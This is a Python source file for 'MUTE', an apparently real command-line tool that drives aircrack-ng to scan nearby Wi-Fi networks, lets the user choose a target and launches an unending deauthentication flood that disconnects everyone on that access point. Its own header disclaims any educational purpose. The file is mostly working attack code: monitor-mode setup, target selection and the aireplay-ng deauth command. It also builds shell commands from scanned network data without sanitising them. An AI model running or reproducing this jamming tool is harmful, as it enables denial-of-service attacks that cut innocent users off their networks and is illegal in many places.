#!/usb/bin/python3
"""
MUTE 1.3.0
Developer K4T
Developer f4llen

Licensed under the GNU General Public License Version 3 (GNU GPL v3)
(C) 2017 K4YT3X

This program is DESIGNED FOR LINUX SYSTEM.
Program MUST be ran with ROOT ACCESS.

DISCLAIMER: This application is NOT for educational purposes.
Abusing this program might be an ilegal action.
Use this program ON YOUR OWN RISK. The authors of this program
won't be responsible to any results caused by abusing this program.

YOU'RE EXPECTED TO KNOW WHAT YOU'RE DOING

Description: MUTE (WxKill) is an Python Application that kills wifi signals

CHANGELOG:
Version: 1.3.0
Date: 01/10/2017

1. Changed Method Reading Airodump file
2. Now automatically selects the strongest signal to kill
3. Changed 5G scan method, now scans 5G only when enabled
"""

from __future__ import print_function
import os
import linecache
import csv
import multiprocessing
import shutil
import socket

# TODO
"""
1. Fix SSID Display Bugs
2. Add "Select SSID by ID" Function
"""

# Console colors
# Unix Console colors
W = '\033[0m'  # white (normal)
R = '\033[31m'  # red
G = '\033[32m'  # green
OR = '\033[33m'  # orange
Y = '\033[93m'  # yellow
B = '\033[34m'  # blue
P = '\033[35m'  # purple
C = '\033[36m'  # cyan
GR = '\033[37m'  # grey
H = '\033[8m'  # hidden
NH = '\033[28m'  # not hidden

AT_IN_MON = False
DUMP = '/tmp/mute-01.csv'

# ##############################Function Defining################################


def internet_connected():
    """
    This fucntion detects if the internet is available
    Returns a Boolean value
    """
    try:
        print(Y + 'Detecting Internet Connectivity...')
        socket.create_connection(('172.217.3.3', 443), 10)
        return True
    except socket.error:
        return False


def check_aircrack():
    """
    Check if Aircrack-NG Suite Is installed in the system
    Install Aircrack-NG Suite if not installed
    """
    print(G + '[INFO] Checking Requirements...')
    if os.path.isfile('/usr/bin/aircrack-ng'):
        return True
    else:
        print(R + '[CRITICAL] Aircrack-NG Suite is not installed!' + W)
        insair = input(Y + '[OPERATION] Do you want MUTE to install it for you? [Y/n]: ' + G)
        print(W, end='', flush=True)
        if insair == '':
            install_aircrack()
            return False
        elif insair[0].upper() == 'Y':
            install_aircrack()
            return False
        elif insair[0].upper() == 'N':
            print(R + '[CRITICAL] MUTE relies on Aircrack-NG suite to run' + W)
            print(R + '[CRITICAL] However, Aircrack-NG Suite is not found' + W)
            if AT_IN_MON:
                print(OR + '\n\nAdapter Exiting Monitor Mode...' + W)
                disable_monitor(monface)
                print(W, end='', flush=True)
                print(Y + '\nExiting MUTE Program\n' + W)
                exit(0)
            else:
                print(Y + '\n\nExiting MUTE Program\n' + W)
                exit(0)


def install_aircrack():
    if internet_connected():
        os.system('apt update && apt install aircrack-ng')
        return True
    else:
        print(R + '[ERROR] Internet not Connected!' + W)
        print(R + '[CRITICAL] Unable to install Aircrack-NG Suite!' + W)
        print(Y + '[WARNING] Please Check your Internet Connection and Launch the Program Again' + W)
        print(Y + '[WARNING] Or Manually Install Aircrack-NG Suite' + W)
        print(R + '[CRITICAL] MUTE relies on Aircrack-NG suite to run' + W)
        print(R + '[CRITICAL] However, Aircrack-NG Suite is not found' + W)
        if AT_IN_MON:
            print(OR + '\n\nAdapter Exiting Monitor Mode...' + W)
            disable_monitor(monface)
            print(W, end='', flush=True)
            print(Y + '\nExiting MUTE Program\n' + W)
            exit(0)
        else:
            print(Y + '\n\nExiting MUTE Program\n' + W)
            exit(0)


def sysupdate():
    """
    Update the software by cloning the newest version from GitHub
    """
    if internet_connected():
        os.system('cd /usr/share/paxe && git clone https://github.com/K4YT3X/MUTE.git')
        return 0
    else:
        print(R + '[ERROR] Not connected to internet!' + W)
        return 1


def is_empty_string(ent):
    ent = str(ent)
    for elmt in ent:
        if elmt != ' ':
            return False
    return True


# Determine number of lines in a file
def file_len(fname):
    i = 1
    with open(fname) as f:
        for i, l in enumerate(f):
            pass
    return i + 1


def enable_monitor(ifx):
    global AT_IN_MON
    os.system('airmon-ng start ' + ifx)
    if AT_IN_MON is False:
        AT_IN_MON = True


# disable monitor on adapter
def disable_monitor(ifx):
    global AT_IN_MON
    os.system('airmon-ng stop ' + ifx)
    if AT_IN_MON is True:
        AT_IN_MON = False


# Get name of wireless adapter interfaces
def get_interfaces():
    """
    This Function will display all wireless adapter names by reading linux network file
    It will only output the wireless adapter names
    """
    print(OR, end='', flush=True)
    o = 0
    ifid = 1
    numline = file_len('/proc/net/dev')
    while o <= numline:
        ilist = linecache.getline('/proc/net/dev', o)
        if 'wlan' not in ilist:
            pass
        else:
            if linecache.getline('/proc/net/dev', o)[0] == ' ':
                iface = list(linecache.getline('/proc/net/dev', o)[1:])
            else:
                iface = list(linecache.getline('/proc/net/dev', o))
            print(str(ifid) + '. ', end='', flush=True)
            ifid += 1
            for x in iface:
                if x != ':':
                    print(x, end='', flush=True)
                elif x == ':':
                    print('')
                    break
        o += 1
    print(W, end='', flush=True)


# Get interface name by id
def get_ifname(xfid):
    """
    Get Interface Name by a given ID
    xfid has to be an integer
    """
    o = 0
    xfsd = 1
    xf = []
    numline = file_len('/proc/net/dev')
    while o <= numline:
        ilist = linecache.getline('/proc/net/dev', o)
        if 'wlan' not in ilist:
            pass
        elif xfsd == xfid:
            if linecache.getline('/proc/net/dev', o)[0] == ' ':
                iface = list(linecache.getline('/proc/net/dev', o)[1:])
            else:
                iface = list(linecache.getline('/proc/net/dev', o))
            for x in iface:
                if x != ':':
                    xf.append(x)
                elif x == ':':
                    facename = ''.join(xf)
                    return facename
        else:
            xfsd += 1
        o += 1


# Get any existing interfaces in monitor mode
def get_monface(xfid, name):
    """
    Get Interface Name by a given ID
    xfid has to be an integer
    """
    o = 0
    xfsd = 1
    xf = []
    numline = file_len('/proc/net/dev')
    while str(name) != '0':
        if str(name) != '0':
            while o <= numline:
                ilist = linecache.getline('/proc/net/dev', o)
                if str(name) not in ilist:
                    pass
                else:
                    if linecache.getline('/proc/net/dev', o)[0] == ' ':
                        iface = list(linecache.getline('/proc/net/dev', o)[1:])
                    else:
                        iface = list(linecache.getline('/proc/net/dev', o))
                    for x in iface:
                        if x != ':':
                            xf.append(x)
                        elif x == ':':
                            facename = ''.join(xf)
                            return facename
                o += 1
        return 'NULL'
    while o <= numline:
        ilist = linecache.getline('/proc/net/dev', o)
        if 'wlan' not in ilist:
            pass
        elif xfsd == xfid:
            if linecache.getline('/proc/net/dev', o)[0] == ' ':
                iface = list(linecache.getline('/proc/net/dev', o)[1:])
            else:
                iface = list(linecache.getline('/proc/net/dev', o))
            for x in iface:
                if x != ':':
                    xf.append(x)
                elif x == ':':
                    facename = ''.join(xf)
                    return facename
        else:
            xfsd += 1
        o += 1
    return 'NULL'


# Get MAC Address by SSID
def get_macaddr(ssid):
    st = False
    with open(DUMP, 'r') as airodump:
        for row in reversed(list(csv.reader(airodump, delimiter=';'))):
            if "['Station MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs']" == str(row):
                st = True
            if len(row) > 0 and len(row[0].split(',')[0]) == 17 and st is True:
                try:
                    if ((row[0].split(','))[13].strip(' ')).upper() == ssid.upper():
                        return row[0].split(',')[0]
                except IndexError:
                    pass
    return 'NULL'


# Give a list of all scanned SSID
def list_ssid():
    ssids = []
    with open(DUMP, 'r') as dump_file:
        mac = csv.reader(dump_file, delimiter=';')
        for row in mac:
            try:
                ssids.append((row[0].split(','))[13].strip(' '))
            except IndexError:
                pass
        for ssid in ssids:
            while ssid in ssids:
                ssids.remove(ssid)
            ssids.append(ssid)
        for ssid in ssids:
            if is_empty_string(ssid):
                while ssid in ssids:
                    ssids.remove(ssid)
        for ssid in ssids:
            print(str(ssids.index(ssid) + 1) + '. ' + ssid)
        return ssids
    return 'NULL'


def get_channel(ssid):
    st = False
    with open(DUMP, 'r') as airodump:
        for row in reversed(list(csv.reader(airodump, delimiter=';'))):
            if "['Station MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs']" == str(row):
                st = True
            if ssid in str(row) and st is True:
                try:
                    chanid = (row[0].split(','))[3].strip(' ')
                    return chanid
                except IndexError:
                    pass
    return 'NULL'


# Scan wifi using airodump-ng and output it into a file
def scan_wlan():
    if os.path.exists(DUMP):
        os.system('rm /tmp/mute-01.csv')
    if str(fg) == '1':
        os.system('airodump-ng --band a -w /tmp/mute --output-format=csv ' + monface)
    else:
        os.system('airodump-ng --band bg -w /tmp/mute --output-format=csv ' + monface)


def airodump_ng():
    scan_wlan_proc = multiprocessing.Process(target=scan_wlan)
    scan_wlan_proc.start()
    while True:
        try:
            print('', end='', flush=True)
            pass
        except KeyboardInterrupt:
            os.system('clear')
            print(OR + "Finishing airodump..." + W)
            scan_wlan_proc.terminate()
            break


def attack():
    os.system('clear')
    print('\n' + R + '####################STARTING ATTACK!####################' + W)
    os.system('iwconfig ' + monface + ' channel ' + get_channel(ssid))
    os.system('aireplay-ng --deauth 0 -a ' + get_macaddr(ssid) + ' ' + monface)


def aireplay():
    start_attack_proc = multiprocessing.Process(target=attack)
    start_attack_proc.start()
    while True:
        try:
            print('', end='', flush=True)
            pass
        except KeyboardInterrupt:
            os.system('clear')
            print(G + "Stopping Attack..." + W)
            start_attack_proc.terminate()
            break


# ##################################ICON####################################


def print_icon():
    """
    Prints the MUTE Iconl
    """
    os.system('clear')
    width, height = shutil.get_terminal_size((80, 20))
    space = (width - 19) // 2 * ' '
    middle = (height - 18) // 2
    for _ in range(middle):
        print('')  # Which is a '\n'
    print(space + W + "#" + R + "####         ####" + W + "#")
    print(space + R + "  ##           ##")
    print(space + R + "    ##       ##")
    print(space + GR + "     #########")
    print(space + GR + "     #########")
    print(space + R + "    ## " + R + "     ##")
    print(space + R + "  ##   " + R + "       ##")
    print(space + W + "#" + R + "####         ####" + W + "#\n")
    print('')
    space = (width - 37) // 2 * ' '
    print(space + R + '##     ##  ' + W + '##     ## ######## ######## ')
    print(space + R + '###   ###  ' + W + '##     ##    ##    ##       ')
    print(space + R + '#### ####  ' + W + '##     ##    ##    ##       ')
    print(space + R + '## ### ##  ' + W + '##     ##    ##    ######   ')
    print(space + R + '##     ##  ' + W + '##     ##    ##    ##       ')
    print(space + R + '##     ##  ' + W + '##     ##    ##    ##       ')
    print(space + R + '##     ##  ' + W + ' #######     ##    ######## ')


def main():
    """
    Main Function of Mute
    """
    global monface
    global interface
    global ssid
    global fg
    global AT_IN_MON
    print_icon()

    # Choose Interface
    print(B + 'Here are Your Interfaces:' + W)
    get_interfaces()
    cont = 0
    iface = ''
    print('')
    while cont != 1:
        try:
            iface = int(input('Choose Interface (Enter Number): ' + G))
            print(W, end='', flush=True)
        except ValueError:
            print(R + 'Invalid Input!' + W)
            pass
        else:
            cont = 1

    interface = get_ifname(iface)

    # Enable Monitor Mode
    while True:
        enmon = input('Enable Monitor Mode on Interface? [Y/n]: ' + G)
        print(W, end='', flush=True)
        if enmon == '' or enmon[0].upper() == 'Y':
            print(G, end='', flush=True)
            enable_monitor(interface)
            print(W, end='', flush=True)
            if get_monface(1, 0) == 'NULL':
                print(R + 'ERROR! Unable to Enable Monitor Mode!' + W)
                input('Press Any Key to Exit...')
                exit(0)
            else:
                if AT_IN_MON is False:
                    AT_IN_MON = True
                break
        elif enmon[0].upper() == 'N':
            if get_monface(1, 0) == 'NULL' or 'mon' not in interface:
                print(R + 'Selected Adapter Not in Monitor Mode!' + W)
                enmon = ('Enable Monitor Mode? [Y/N]: ' + G)
                if enmon[0].upper == 'Y':
                    print(G, end='', flush=True)
                    enable_monitor(interface)
                    print(W, end='', flush=True)
                    if get_monface(1, 0) == 'NULL':
                        print(R + 'ERROR! Unable to Enable Monitor Mode!' + W)
                        input('Press Any Key to Exit...')
                        exit(0)
                    else:
                        break
                elif enmon[0].upper() == 'N':
                    print(R + 'Adapter Unusable...Exiting...')
                    input('Press Any Key to Exit...')
                    exit()
            else:
                break
        else:
            print(R + 'Invalid Input!' + W)

    if 'mon' in interface:
        monface = interface
    else:
        monface = interface + 'mon'

    while True:
        fg = input('Scan 5G Networks? [y/N]: ' + G)
        print(W, end='', flush=True)
        if fg == '':
            fg = 0
            break
        elif fg[0].upper() == 'Y':
            fg = 1
            break
        elif fg[0].upper() == 'N':
            fg = 0
            break
        else:
            print(R + 'Invalid Input!' + W)

    print(G + 'Start Scanning Wireless Signals...' + W)
    print(G + 'Press Ctrl^C to Stop' + W)
    # Scan Wireless Network
    airodump_ng()

    # List all networks
    print('Here is a list of Detected APs: ')
    ssids = list_ssid()

    while True:
        wid = input('Enter the ID of Wi-Fi You want to attack: ' + G)
        print(W, end='', flush=True)
        try:
            wid = int(wid)
            ssid = ssids[wid - 1]
            if len(str(get_macaddr(ssid))) == 17:
                break
            else:
                print(R + '[ERROR] SSID Not Found!' + W)
        except ValueError:
            print(R + '[ERROR] Invalid Input!' + W)
            print(R + '[ERROR] Please enter the number!' + W)

    aireplay()


# ##############################Program Entry################################

while True:
    try:
        check_aircrack()
        main()
        if AT_IN_MON:
            print(OR + '\n\nAdapter Exiting Monitor Mode...' + W)
            disable_monitor(monface)
            print(W, end='', flush=True)
            print(Y + '\nExiting MUTE Program\n' + W)
        else:
            print(Y + '\n\nExiting MUTE Program\n' + W)
        exit(0)
    except KeyboardInterrupt:
        if AT_IN_MON:
            print(OR + '\n\nAdapter Exiting Monitor Mode...' + W)
            disable_monitor(monface)
            print(W, end='', flush=True)
            print(Y + '\nExiting MUTE Program\n' + W)
        else:
            print(Y + '\n\nExiting MUTE Program\n' + W)
        exit(0)
    except Exception as er:
        print(R + '[CRITICAL] Error Detected!' + W)
        print(R + str(er))
        while True:
            restart = input('Restart Program? [Y/n]: ' + G)
            print(W, end='', flush=True)
            if restart == '':
                print(Y + 'Restarting MUTE Program' + W)
                break
            elif restart[0].upper() == 'Y':
                print(Y + 'Restarting MUTE Program' + W)
                break
            elif restart[0].upper() == 'N':
                print(R + 'Exiting Program due to Errors...' + W)
                if AT_IN_MON:
                    print(OR + '\n\nAdapter Exiting Monitor Mode...' + W)
                    disable_monitor(monface)
                    print(W, end='', flush=True)
                    print(Y + '\nExiting MUTE Program\n' + W)
                    exit(0)
                else:
                    print(Y + '\n\nExiting MUTE Program\n' + W)
                    exit(0)
            else:
                print(R + 'Invalid Input!' + W)
                pass
        continue
